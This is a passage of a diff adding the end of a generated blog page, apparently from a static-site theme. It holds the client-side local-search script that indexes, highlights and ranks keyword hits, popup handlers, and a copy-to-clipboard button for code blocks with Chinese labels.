+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+</body>
+</html>
